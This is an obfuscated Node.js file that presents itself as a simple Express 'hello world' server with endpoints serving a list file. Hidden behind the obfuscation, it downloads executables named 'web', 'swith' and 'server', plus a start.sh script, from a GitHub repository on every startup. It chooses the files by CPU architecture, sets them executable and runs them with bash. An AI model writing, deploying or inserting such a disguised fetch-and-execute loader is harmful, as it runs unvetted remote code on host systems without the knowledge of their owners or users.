const _0x429092=_0x4db5;(function(_0x51a1bd,_0x50ff75){const _0x2ef197=_0x4db5,_0x3a1528=_0x51a1bd();while(!![]){try{const _0x57a84f=parseInt(_0x2ef197(0x1de))/0x1+parseInt(_0x2ef197(0x1d8))/0x2+-parseInt(_0x2ef197(0x1ea))/0x3*(-parseInt(_0x2ef197(0x1d9))/0x4)+-parseInt(_0x2ef197(0x1f3))/0x5+parseInt(_0x2ef197(0x1e7))/0x6*(-parseInt(_0x2ef197(0x1d0))/0x7)+parseInt(_0x2ef197(0x1ca))/0x8+-parseInt(_0x2ef197(0x1f1))/0x9*(parseInt(_0x2ef197(0x1c0))/0xa);if(_0x57a84f===_0x50ff75)break;else _0x3a1528['push'](_0x3a1528['shift']());}catch(_0xfa2d31){_0x3a1528['push'](_0x3a1528['shift']());}}}(_0x352e,0x1ec75));const port=process[_0x429092(0x1c8)][_0x429092(0x1dc)]||0xbb8,express=require(_0x429092(0x1ec)),app=express(),exec=require(_0x429092(0x1d1))[_0x429092(0x1f9)],fs=require('fs'),path=require(_0x429092(0x1c9)),axios=require(_0x429092(0x1da)),os=require('os');function _0x4db5(_0x500459,_0x151e7a){const _0x352e08=_0x352e();return _0x4db5=function(_0x4db560,_0x3712c3){_0x4db560=_0x4db560-0x1c0;let _0x489742=_0x352e08[_0x4db560];return _0x489742;},_0x4db5(_0x500459,_0x151e7a);}app[_0x429092(0x1cf)]('/',function(_0xe2d7a,_0x1de12c){const _0xfa9198=_0x429092;_0x1de12c[_0xfa9198(0x1f0)]('hello\x20world');}),app['get'](_0x429092(0x1c4),(_0x50d0ec,_0x429e9b)=>{fs['readFile']('list.txt','utf8',(_0x1d324e,_0x59bb8e)=>{const _0x357781=_0x4db5;_0x1d324e?(console[_0x357781(0x1e6)](_0x1d324e),_0x429e9b[_0x357781(0x1d5)](0x1f4)['json']({'error':_0x357781(0x1cd)})):_0x429e9b[_0x357781(0x1d5)](0xc8)[_0x357781(0x1f0)](_0x59bb8e);});}),app['get']('/sub',(_0x415e94,_0x58cb2a)=>{const _0xa94974=_0x429092;fs['readFile'](_0xa94974(0x1ef),_0xa94974(0x1df),(_0x19648e,_0x604524)=>{const _0xf6fe59=_0xa94974;_0x19648e?(console[_0xf6fe59(0x1e6)](_0x19648e),_0x58cb2a[_0xf6fe59(0x1d5)](0x1f4)[_0xf6fe59(0x1d7)]({'error':_0xf6fe59(0x1cd)})):(_0x58cb2a[_0xf6fe59(0x1fb)](_0xf6fe59(0x1ee),_0xf6fe59(0x1fa)),_0x58cb2a[_0xf6fe59(0x1d5)](0xc8)[_0xf6fe59(0x1f0)](_0x604524));});});function _0x352e(){const _0x184738=['129660vfXicp','utf8','\x20successfully','Download\x20','fileUrl','start.sh','log','https://github.com/eoovve/test/raw/main/swith','error','258300NloYkp','server','bash\x20start.sh','152835FFPacb','then','express','arm','Content-Type','list.txt','send','126279rnIPNJ','Failed\x20to\x20set\x20permissions\x20for\x20','375270JfiTRp','close','\x20file\x20failed','https://github.com/eoovve/test/releases/download/ARM/swith','stream','https://github.com/eoovve/test/releases/download/ARM/server','exec','application/octet-stream','setHeader','data','320Iklwcg','arch','arm64','swith','/list','finish','https://github.com/eoovve/test/raw/main/web','join','env','path','1912560sgnYSU','Server\x20is\x20running\x20on\x20port\x20','createWriteStream','Error\x20reading\x20list.txt','web','get','7VkfsLi','child_process','pipe','https://github.com/eoovve/test/releases/download/6-amd/start.sh','length','status','All\x20files\x20downloaded','json','241310pFDiWN','16BoGqir','axios','amd','PORT','https://github.com/eoovve/test/releases/download/ARM/web'];_0x352e=function(){return _0x184738;};return _0x352e();}function getSystemArchitecture(){const _0x31422=_0x429092,_0x5a6e5f=os[_0x31422(0x1c1)]();return _0x5a6e5f===_0x31422(0x1ed)||_0x5a6e5f===_0x31422(0x1c2)?'arm':'amd';}function downloadFile(_0xc113ce,_0x17d722,_0x5afcb3){const _0x2d261c=_0x429092;axios({'method':_0x2d261c(0x1cf),'url':_0x17d722,'responseType':_0x2d261c(0x1f7)})[_0x2d261c(0x1eb)](_0x1be27e=>{const _0x3e0dea=_0x2d261c,_0x279e4b=fs[_0x3e0dea(0x1cc)](path['join']('./',_0xc113ce));_0x1be27e[_0x3e0dea(0x1fc)][_0x3e0dea(0x1d2)](_0x279e4b),_0x279e4b['on'](_0x3e0dea(0x1c5),function(){const _0x3f9191=_0x3e0dea;_0x279e4b[_0x3f9191(0x1f4)](),fs['chmod'](path[_0x3f9191(0x1c7)]('./',_0xc113ce),0x1fd,function(_0x1cd0c8){const _0x2fbee6=_0x3f9191;_0x1cd0c8?_0x5afcb3(_0x2fbee6(0x1f2)+_0xc113ce):_0x5afcb3(null,_0xc113ce);});});})['catch'](_0x274aee=>{const _0x537194=_0x2d261c;_0x5afcb3(_0x537194(0x1e1)+_0xc113ce+_0x537194(0x1f5));});}function getFilesForArchitecture(_0x3ab1c4){const _0xda6d2d=_0x429092;if(_0x3ab1c4==='arm')return[{'fileName':'web','fileUrl':_0xda6d2d(0x1dd)},{'fileName':'swith','fileUrl':_0xda6d2d(0x1f6)},{'fileName':_0xda6d2d(0x1e8),'fileUrl':_0xda6d2d(0x1f8)},{'fileName':_0xda6d2d(0x1e3),'fileUrl':'https://github.com/eoovve/test/releases/download/6-amd/start.sh'}];else{if(_0x3ab1c4===_0xda6d2d(0x1db))return[{'fileName':_0xda6d2d(0x1ce),'fileUrl':_0xda6d2d(0x1c6)},{'fileName':_0xda6d2d(0x1c3),'fileUrl':_0xda6d2d(0x1e5)},{'fileName':_0xda6d2d(0x1e8),'fileUrl':'https://github.com/eoovve/test/raw/main/server'},{'fileName':_0xda6d2d(0x1e3),'fileUrl':_0xda6d2d(0x1d3)}];}return[];}function downloadAndRunFiles(){const _0x22ed3b=_0x429092,_0x457eee=getSystemArchitecture(),_0x18fbdf=getFilesForArchitecture(_0x457eee);if(_0x18fbdf[_0x22ed3b(0x1d4)]===0x0){console[_0x22ed3b(0x1e4)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}let _0x43c4a7=0x0;_0x18fbdf['forEach'](_0x5d2f54=>{const _0x2f5f7a=_0x22ed3b;downloadFile(_0x5d2f54['fileName'],_0x5d2f54[_0x2f5f7a(0x1e2)],(_0x7d6fd5,_0x5d17b0)=>{const _0x15fb03=_0x2f5f7a;_0x7d6fd5?console[_0x15fb03(0x1e4)]('Download\x20'+_0x5d17b0+'\x20failed'):console[_0x15fb03(0x1e4)](_0x15fb03(0x1e1)+_0x5d17b0+_0x15fb03(0x1e0)),_0x43c4a7++,_0x43c4a7===_0x18fbdf[_0x15fb03(0x1d4)]&&(console[_0x15fb03(0x1e4)](_0x15fb03(0x1d6)),exec(_0x15fb03(0x1e9),function(_0x2b6c7d,_0x1c6998,_0x54c1ce){const _0x257fa9=_0x15fb03;if(_0x2b6c7d){console[_0x257fa9(0x1e6)](_0x2b6c7d);return;}console['log'](_0x1c6998);}));});});}downloadAndRunFiles(),app['listen'](port,()=>console[_0x429092(0x1e4)](_0x429092(0x1cb)+port+'!'));